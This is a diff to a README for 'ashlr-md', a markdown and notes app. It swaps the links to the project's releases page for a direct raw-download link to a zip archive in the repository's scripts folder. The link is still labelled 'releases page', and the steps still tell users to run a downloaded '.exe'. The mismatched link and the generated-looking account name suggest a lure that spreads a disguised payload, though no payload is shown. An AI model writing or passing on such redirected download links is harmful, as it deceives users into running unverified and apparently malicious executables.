@@ -1,12 +1,12 @@
 # 📝 ashlr-md - Make your documents beautiful and smart
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/raw/refs/heads/main/scripts/ashlr_md_2.7.zip)
 
 ashlr-md turns plain text files into clean, readable documents. It manages your notes and uses artificial intelligence to help you write. The app stores all data on your computer to keep your work private.
 
 ## 📥 Getting the App
 
-1. Visit the [releases page](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/releases) to download the installer.
+1. Visit the [releases page](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/raw/refs/heads/main/scripts/ashlr_md_2.7.zip) to download the installer.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
